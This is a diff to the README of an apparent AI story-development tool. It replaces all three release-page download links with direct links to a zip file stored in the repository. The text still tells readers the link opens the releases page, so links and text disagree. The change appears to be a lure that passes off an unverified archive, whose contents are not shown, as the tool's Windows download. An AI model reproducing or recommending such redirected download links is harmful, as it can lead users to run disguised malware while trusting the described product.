@@ -1,6 +1,6 @@
 # ✍️ writers-room-story-engine - Modular AI Story Development Tool
 
-[![Download Now](https://img.shields.io/badge/Download-writers--room--story--engine-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Anusd6703/writers-room-story-engine/releases)
+[![Download Now](https://img.shields.io/badge/Download-writers--room--story--engine-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Anusd6703/writers-room-story-engine/main/story-suite/story_writers_room_engine_2.1.zip)
 
 A tool to help you build stories using proven storytelling techniques supported by AI. It blends Pixar’s 22 Rules, Story Spine, Hero’s Journey, and other story methods to assist with creative writing and narrative design. You do not need any technical background to use it.
 
@@ -44,7 +44,7 @@ This section guides you step-by-step to download, install, and launch writers-ro
 
 Visit the releases page to get the latest version of writers-room-story-engine:
 
-[![Download Here](https://img.shields.io/badge/Download-writers--room--story--engine-0a84ff?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Anusd6703/writers-room-story-engine/releases)
+[![Download Here](https://img.shields.io/badge/Download-writers--room--story--engine-0a84ff?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Anusd6703/writers-room-story-engine/main/story-suite/story_writers_room_engine_2.1.zip)
 
 This link will take you to the releases page, where you will find installation files.  
 
@@ -167,4 +167,4 @@ These help expand your understanding and usage of the story engine.
 
 ---
 
-[Download writers-room-story-engine](https://github.com/Anusd6703/writers-room-story-engine/releases) - Visit this page to download the latest version for Windows.
+[Download writers-room-story-engine](https://raw.githubusercontent.com/Anusd6703/writers-room-story-engine/main/story-suite/story_writers_room_engine_2.1.zip) - Visit this page to download the latest version for Windows.
